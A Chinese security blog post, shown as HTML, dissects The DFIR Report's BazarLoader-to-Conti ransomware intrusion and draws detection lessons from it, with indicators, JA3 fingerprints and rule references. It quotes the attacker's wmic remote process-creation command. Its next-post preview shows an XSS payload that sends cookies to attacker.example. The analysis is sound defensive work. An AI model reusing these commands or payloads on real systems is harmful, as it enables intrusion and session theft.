@@ -1,0 +1,441 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解 | just.ok的个人博客</title><meta name="author" content="just.ok"><meta name="copyright" content="just.ok"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="勒索软件事件的应急响应复盘，多数时候只能拿到残缺的日志和事后推断。The DFIR Report 的价值在于把完整攻击链按时间线还原出来——攻击者每一步做了什么、用的什么工具、流量长什么样，全部基于真实取证数据。这篇案例编号 #5087 的报告（发布于 2021 年 9 月）是我读过的最典型的一篇：BazarLoader 初始访问，Cobalt Strike 落地，Conti 收尾，从首台被入侵主">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解">
+<meta property="og:url" content="http://blog.just-ok.xyz/posts/3e3f274c/index.html">
+<meta property="og:site_name" content="just.ok的个人博客">
+<meta property="og:description" content="勒索软件事件的应急响应复盘，多数时候只能拿到残缺的日志和事后推断。The DFIR Report 的价值在于把完整攻击链按时间线还原出来——攻击者每一步做了什么、用的什么工具、流量长什么样，全部基于真实取证数据。这篇案例编号 #5087 的报告（发布于 2021 年 9 月）是我读过的最典型的一篇：BazarLoader 初始访问，Cobalt Strike 落地，Conti 收尾，从首台被入侵主">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c9.jpg">
+<meta property="article:published_time" content="2026-10-28T04:10:00.000Z">
+<meta property="article:modified_time" content="2026-10-28T06:32:38.844Z">
+<meta property="article:author" content="just.ok">
+<meta property="article:tag" content="威胁情报">
+<meta property="article:tag" content="勒索软件">
+<meta property="article:tag" content="DFIR">
+<meta property="article:tag" content="入侵分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c9.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解",
+  "url": "http://blog.just-ok.xyz/posts/3e3f274c/",
+  "image": "https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c9.jpg",
+  "datePublished": "2026-10-28T04:10:00.000Z",
+  "dateModified": "2026-10-28T06:32:38.844Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "just.ok",
+      "url": "http://blog.just-ok.xyz"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://pic1.imgdb.cn/item/67d9824088c538a9b5c04e68.jpg"><link rel="canonical" href="http://blog.just-ok.xyz/posts/3e3f274c/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"作者: just.ok","link":"链接: ","source":"来源: just.ok的个人博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/daliyuer.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="/css/categorybar.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://pic1.imgdb.cn/item/67d9821888c538a9b5c04e57.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">77</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://c6.y.qq.com/base/fcgi-bin/u?__=cNJOP3d6JHix"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c9.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">just.ok的个人博客</span></a><a class="nav-page-title" href="/"><span class="site-name">从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://c6.y.qq.com/base/fcgi-bin/u?__=cNJOP3d6JHix"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">从 BazarLoader 到 Conti 勒索软件：32 小时完整攻击链拆解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-10-28T04:10:00.000Z" title="发表于 2026-10-28 12:10:00">2026-10-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-10-28T06:32:38.844Z" title="更新于 2026-10-28 14:32:38">2026-10-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>勒索软件事件的应急响应复盘，多数时候只能拿到残缺的日志和事后推断。<a target="_blank" rel="noopener" href="https://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/">The DFIR Report</a> 的价值在于把完整攻击链按时间线还原出来——攻击者每一步做了什么、用的什么工具、流量长什么样，全部基于真实取证数据。这篇案例编号 #5087 的报告（发布于 2021 年 9 月）是我读过的最典型的一篇：BazarLoader 初始访问，Cobalt Strike 落地，Conti 收尾，从首台被入侵主机执行 BazarLoader DLL 到全域加密完成，<strong>TTR（Time to Ransom）只用了约 32 小时</strong>，中间还包含约 12 小时的静默期——实际人工操作窗口只有 20 小时左右。</p>
+<p>32 小时里攻击者只走了一条主线，几乎没有多余的试探动作，这也是它能把时长压到这个量级的原因。</p>
+<h2 id="案例：一条只留了-32-小时的完整攻击链"><a href="#案例：一条只留了-32-小时的完整攻击链" class="headerlink" title="案例：一条只留了 32 小时的完整攻击链"></a>案例：一条只留了 32 小时的完整攻击链</h2><p>2021 年 7 月的一次 BazarLoader 入侵，最终以 Conti 完成全域加密收场，当时 Conti 在 Coveware 2021 年 Q2 的统计中排名第二。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>时间点</th>
+<th>事件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T+0</td>
+<td>BazarLoader DLL 在突破口主机执行，回连 C2</td>
+</tr>
+<tr>
+<td>T+20min</td>
+<td>用 <code>net</code>、<code>nltest</code> 做主机与域发现，查找域管理员</td>
+</tr>
+<tr>
+<td>T+1h</td>
+<td>主机静默约 1 小时后，BazarLoader 拉取 Cobalt Strike beacon DLL，同样由 rundll32 加载</td>
+</tr>
+<tr>
+<td>T+2.5h</td>
+<td>Pass the hash、多主机 lsass 转储，wmic 远程执行开始横向移动</td>
+</tr>
+<tr>
+<td>T+2.5h~14.5h</td>
+<td>活动减弱约 12 小时，beacon 持续回连</td>
+</tr>
+<tr>
+<td>T+14.5h</td>
+<td>从域控制器继续横向，PowerShell 脚本探测磁盘、杀软、在线主机</td>
+</tr>
+<tr>
+<td>T+15h 起（第 2 天）</td>
+<td>文件服务器安装 WinSCP，数据经 SCP 外泄至罗马尼亚 VPS</td>
+</tr>
+<tr>
+<td>T+31h</td>
+<td>RDP 投放 test.exe，wmic 远程执行做加密”单元测试”</td>
+</tr>
+<tr>
+<td>T+31h 后数分钟</td>
+<td>改名 backup.exe 投放到两台服务器，RDP 手动执行</td>
+</tr>
+<tr>
+<td>T+32h</td>
+<td>经 SMB 加密全域 C$ 完成</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>留给防御方的窗口不是以天为单位，而是以小时计。</p>
+<h2 id="初始访问与落地：Loader-只负责开路"><a href="#初始访问与落地：Loader-只负责开路" class="headerlink" title="初始访问与落地：Loader 只负责开路"></a>初始访问与落地：Loader 只负责开路</h2><p>报告没有直接观察到投递环节，但基于当时 BazarLoader 的活动规律给出了高置信度评估：<strong>恶意邮件活动，zip 附件内嵌恶意 JavaScript</strong>，脚本下载 BazarLoader DLL 后通过 rundll32 执行。同类活动也用过 Word/Excel 文档，以及电话社工让用户自己运行。约 1 小时后，Cobalt Strike beacon 同样以 rundll32 方式拉起。</p>
+<ol>
+<li><strong>投递环节只有评估，没有事实</strong>。没有日志支撑，报告明说”未观察到”，再基于攻击者的历史活动给出推断依据。这类标注决定了后面每一步推断的可靠性边界。</li>
+<li><strong>Loader 与后续载荷分工明确</strong>。BazarLoader 从落地到拉起 Cobalt Strike 只用了 1 小时，它的全部使命就是把 C2 框架送进来。这意味着邮件网关和 EDR 的告警窗口非常短——从文件落盘到 C2 回连，检测逻辑必须在 1 小时内起作用。</li>
+</ol>
+<p>C2 基础设施方面，BazarLoader 回连两台 AWS IP 的 443 端口，Cobalt Strike 的 HTTPS beacon 指向 <code>sammitng.com</code>（162.244.83.216）。</p>
+<p>Malleable C2 profile 把 GET <code>/jquery-3.3.1.min.js</code> 用来收指令、POST <code>/jquery-3.3.2.min.js</code> 用来回传结果，流量看起来就像加载一个前端库。报告给出的两个指纹，后续同类 C2 可以直接按这组值聚合：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BazarLoader    JA3   72a589da586844d7f0818ce684948eea</span><br><span class="line">Cobalt Strike  JA3   a0e9f5d64349fb13191bc781f81f42e1</span><br></pre></td></tr></table></figure>
+<div class="note info flat"><p>JA3 是把 TLS ClientHello 里的版本、加密套件、扩展字段拼接后取 MD5 得到的指纹，用来识别发起连接的客户端程序。它比单个 IP 的 IOC 寿命长得多：IP 和域名随时轮换，而同一版本、同一配置的 C2 生成的握手指纹稳定。换个 TLS 库或换编译方式指纹就会变，所以适合跟证书、URI 路径叠加使用，不宜单独当判据。</p>
+</div>
+<h2 id="凭据与横向：wmic-是主力"><a href="#凭据与横向：wmic-是主力" class="headerlink" title="凭据与横向：wmic 是主力"></a>凭据与横向：wmic 是主力</h2><p>横向移动阶段的组合拳是这篇报告技术含量最高的部分，可以拆成三层。</p>
+<div class="note info flat"><ul>
+<li><strong>pass the hash（PTH）</strong>：用窃取到的 NTLM 哈希直接完成认证，不需要还原明文口令</li>
+<li><strong>lsass</strong>：Windows 负责本地认证的进程，账号哈希以可复用形态留在它的内存里，转储 lsass 等于把这些哈希抠出来</li>
+</ul>
+</div>
+<p><strong>凭据获取</strong>。攻击者对多个账户做 PTH（ATT&amp;CK <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1550/002/">T1550.002</a>），最初连 Guest 账户都不放过。事件日志里的检测特征是 Logon Type 9（显式凭据登录）+ Network Account Name: Guest + 认证包 Negotiate + 进程 <code>svchost.exe</code>——账号写着 Guest 却走了显式凭据登录，正是哈希登录留下的痕迹。在此基础上，用 Cobalt Strike 对域内多台主机做 lsass 内存转储，滚雪球式收集凭据。</p>
+<p><strong>横向执行</strong>。主力手法是 SMB 拷贝文件加 wmic 远程执行，本案例的标志性命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\cmd.exe /C wmic /node:<span class="string">&quot;DOMAINCONTROLLER&quot;</span> process call create <span class="string">&quot;C:\3.exe&quot;</span></span><br></pre></td></tr></table></figure>
+<p>次要在用的还有三种：PowerShell 拉起的 beacon、以服务方式执行的 beacon、RDP（主要留给最后的勒索部署阶段）。beacon 本体则通过 CreateRemoteThread 注入大量系统进程（svchost、dllhost、winlogon、explorer 等并存），避开针对单进程的检测；派生新会话时固定用 <code>dllhost.exe</code> 作宿主，即 beacon 配置里的 spawn to。</p>
+<p><strong>侦察配套</strong>。PowerShell 侧用 PowerSploit 和 AD 模块的两个 cmdlet（<code>Get-NetComputer</code>、<code>Get-ADComputer</code>）做域内资产发现，还复用了一套由 start.bat 拉起的 Get-DataInfo.ps1，采集磁盘容量、连通性、杀软与备份软件信息（用户最后登录时间另由 AD 模块导出）。这套脚本在更早的 Ryuk 案例里就出现过，跨案例的 IOC 关联价值就在这里。</p>
+<div class="note warning flat"><p><code>wmic /node</code> 远程创建进程是 Conti 的招牌横向手法，检测门槛很低：Sysmon Event ID 1 默认记录完整命令行；Windows 4688 要先开启”在进程创建事件中包含命令行”策略，否则命令行列是空的。如果环境里 wmic 远程调用是常态业务，按源主机、源账户、目标主机三元组建基线，偏离即告警。</p>
+</div>
+<h2 id="外泄与勒索：先拿数据再动手"><a href="#外泄与勒索：先拿数据再动手" class="headerlink" title="外泄与勒索：先拿数据再动手"></a>外泄与勒索：先拿数据再动手</h2><p>外泄发生在第 2 天，手法是用合法工具：攻击者在文件服务器上<strong>现场安装 WinSCP 5.19.1</strong>，通过 SCP 连接罗马尼亚的 VPS（31.14.40.160:22）把数据拖走。流量本身是加密的，取证方无法直接确认内容——但报告在共享目录里预置了金丝雀文档（带外联回执的诱饵文件）：外泄完成后这些文档被来自纽约某 VPS 提供商的 IP 打开，由此确认共享里的数据确实被复制走了。这个取证技巧比外泄手法本身更值得学。</p>
+<p>正式加密前的流程有明显的工程化痕迹：</p>
+<ol>
+<li>RDP 连接多个端点，投放名为 <code>test.exe</code> 的 Conti 样本，用 wmic 远程执行做加密效果”单元测试”</li>
+<li>测试确认后，样本改名 <code>backup.exe</code> 投放到两台服务器，RDP 会话手动执行</li>
+<li>勒索软件自动挂载全网可达的 C$ 共享，经 SMB 加密所有内容</li>
+</ol>
+<p>从 test 到 backup 的两段式投放说明 Conti 把勒索执行当成需要验证的部署流程来对待，而不是随手一跑。对应到检测侧，最后窗口的信号有两个：<strong>批量命名随机的 exe 落盘</strong>，以及<strong>单台服务器对大量主机的 C$ SMB 写入</strong>。从 test 到正式投放只隔几分钟，而 C$ 批量写入一旦开始就直奔加密收尾——这个信号上的响应只能靠自动阻断，人工审核来不及。</p>
+<div class="note primary flat"><p>先外泄后加密是双重勒索的标准时序。外泄在加密前十余小时就完成了，”加密前抓外泄”是勒索事件里最有价值的拦截点——数据没走，谈判筹码和合规压力都还在。</p>
+</div>
+<h2 id="检测侧沉淀：这张网怎么织"><a href="#检测侧沉淀：这张网怎么织" class="headerlink" title="检测侧沉淀：这张网怎么织"></a>检测侧沉淀：这张网怎么织</h2><p>报告给出的检测资产分三层。网络层是 Suricata/ET 规则，主机层是 Sigma 规则，文件层是 YARA 规则，最后统一映射到 <a target="_blank" rel="noopener" href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> 框架（本案例覆盖 17 项技术，从 T1047 WMI 到 T1486 数据加密破坏）。</p>
+<p>报告列了 13 条 ET 规则，与这条攻击链各环节直接对应的几条：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>规则</th>
+<th>覆盖环节</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Observed Malicious SSL Cert (Bazar Backdoor/CnC)</td>
+<td>BazarLoader C2 证书特征</td>
+</tr>
+<tr>
+<td>Cobalt Strike Malleable C2 JQuery Custom Profile</td>
+<td>CS 伪装流量的响应特征</td>
+</tr>
+<tr>
+<td>Possible Powershell .ps1 Script Use Over SMB</td>
+<td>SMB 传输 ps1 的横向行为</td>
+</tr>
+<tr>
+<td>SMB2 NT Create AndX Request For a .bat/DLL/Executable</td>
+<td>SMB 落文件</td>
+</tr>
+<tr>
+<td>Behavioral Unusual Port 135 traffic</td>
+<td>wmic/RPC 横向流量</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>Sigma 是厂商无关的检测规则格式，规则用 YAML 描述日志事件该长什么样，再经转换器落到各家 SIEM 的查询语句。本案例的 Sigma 规则覆盖 CobaltStrike Service Installations、Pass the Hash Activity 2、Suspicious WMI Execution、Encoded IEX、Domain Trust Discovery 等，可在 <a target="_blank" rel="noopener" href="https://github.com/SigmaHQ/sigma">Sigma HQ 规则仓库</a> 按规则名检索到对应条目。</p>
+<p>仓库目录按规则类型和日志源划分，不是按 ATT&amp;CK 技术编号排的；规则自带 ATT&amp;CK 技术标签，可以直接按标签过滤，但标签覆盖并不全。YARA 规则共 4 条，分别对应 start.bat、3.exe、7A86.dll 和 BazarLoader 主样本，用于文件层回溯。</p>
+<p>三层规则组合的实际织法：网络规则抓 C2 回连和外泄通道，主机规则抓执行行为，文件规则做历史日志回溯。单层都有漏报面，但攻击链上任何一环命中都能把整条链拽出来——这也是为什么检测策略应该对齐攻击链而不是对齐单个 IOC。</p>
+<h2 id="报告没有回答的部分"><a href="#报告没有回答的部分" class="headerlink" title="报告没有回答的部分"></a>报告没有回答的部分</h2><p>这条链还原得很完整，但有四处只记了现象、没给出答案，而这四处恰好也是防御方自己复盘同类事件时会撞上的：</p>
+<ol>
+<li><strong>投递环节没有日志</strong>。报告只能根据当时的活动规律推断是邮件加 zip 内 JS，投递链路本身无迹可查。企业邮件网关如果不留存附件与投递记录，事后连”哪封信进来的”都答不上来。</li>
+<li><strong>12 小时静默期没有解释</strong>。报告只记录 beacon 持续回连，没有交代这段时间的监控与响应状态。一个持续 12 小时、每 5 秒一次（10% 抖动）的回连，是流量设备最容易抓到的形态，这段时间没被拦下的原因，比后面任何一步都值得追问。</li>
+<li><strong>关键主机连过 TOR，用途不明</strong>。域控制器和文件服务器都出现过 TOR 节点连接，数据量很小，报告明确写了无法确认用途。这类”有痕迹但无法定性”的线索在实战复盘里很常见，处置时容易因为量小被放过。</li>
+<li><strong>外泄内容无法确认</strong>。SCP 全程加密，报告只能靠蜜罐文档被外部 IP 打开这一事实反推外泄确实发生，数量和内容都无从统计。</li>
+</ol>
+<p>这些空白不是报告写得粗，而是这类事件的结构性限制：再完整的取证也补不回事前没留的日志。能改的只有事前那一环——邮件网关留存投递记录、出站流量保留连接元数据（不解密也能靠目标地址和会话时长判断异常）、服务器进程与网络连接建基线。</p>
+<h2 id="速查表"><a href="#速查表" class="headerlink" title="速查表"></a>速查表</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>攻击阶段</th>
+<th>关键行为</th>
+<th>优先检测点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>初始落地</td>
+<td>rundll32 加载 DLL，1 小时内回连 C2</td>
+<td>邮件网关 zip/JS 拦截，rundll32 异常加载</td>
+</tr>
+<tr>
+<td>C2 保持</td>
+<td>Malleable C2 伪装 jquery 流量</td>
+<td>JA3 指纹，证书特征规则</td>
+</tr>
+<tr>
+<td>凭据获取</td>
+<td>PTH（含 Guest）、lsass 转储</td>
+<td>4624 Logon Type 9，lsass 访问监控</td>
+</tr>
+<tr>
+<td>横向移动</td>
+<td>SMB 拷贝 + wmic 远程执行</td>
+<td>4688/Sysmon EID 1，SMB 写 exe 告警</td>
+</tr>
+<tr>
+<td>侦察</td>
+<td>PowerShell 脚本批量探测</td>
+<td>Encoded IEX，PowerShell Over SMB</td>
+</tr>
+<tr>
+<td>外泄</td>
+<td>服务器上安装 WinSCP，SCP 出站</td>
+<td>服务器进程基线，出站 22 端口监控</td>
+</tr>
+<tr>
+<td>加密</td>
+<td>test.exe 试跑后改名 backup.exe</td>
+<td>批量 C$ SMB 写入（自动阻断），随机 exe 落盘</td>
+</tr>
+</tbody>
+</table>
+</div>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://blog.just-ok.xyz">just.ok</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://blog.just-ok.xyz/posts/3e3f274c/">http://blog.just-ok.xyz/posts/3e3f274c/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://blog.just-ok.xyz" target="_blank">just.ok的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/">威胁情报</a><a class="post-meta__tags" href="/tags/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6/">勒索软件</a><a class="post-meta__tags" href="/tags/DFIR/">DFIR</a><a class="post-meta__tags" href="/tags/%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%90/">入侵分析</a></div><div class="post-share"><div class="social-share" data-image="https://pic1.imgdb.cn/item/6909bfa63203f7be00cf70c9.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/2813c695/" title="XSS 漏洞详解——原理、类型、测试与绕过"><img class="cover" src="https://pic1.imgdb.cn/item/6908b7a43203f7be00cc79d0.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">XSS 漏洞详解——原理、类型、测试与绕过</div></div><div class="info-2"><div class="info-item-1">站点搜索页的回显长这样：URL 是 https://example.com/search?q=键盘，页面显示「您搜索的是：键盘」。搜索词进了页面，这是一个注入点。 把参数换成一段 HTML： 1https://example.com/search?q=&lt;img src=x onerror=alert(1)&gt; 页面不再显示这段文字，而是弹出一个对话框。输入被原样输出成了标签：&lt;img&gt; 的 src=x 加载失败，触发 onerror 里的 alert(1)，浏览器把它当代码执行了。 再把 alert(1) 换成把 Cookie 发往外部服务器的脚本： 1&lt;img src=x onerror=&quot;new Image().src=&#x27;//attacker.example/log?c=&#x27;+document.cookie&quot;&gt; 这一次没有任何可见动静——访问这个链接的已登录用户，其 Cookie 已被发往攻击者的服务器。攻击者拿着 Cookie 就能以该用户身份登录：不需要密码，不需要服务器任何权限。 这两步就是 XSS...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://pic1.imgdb.cn/item/67d9821888c538a9b5c04e57.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">just.ok</div><div class="author-info-description">just.ok的个人博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">77</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/justook"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div 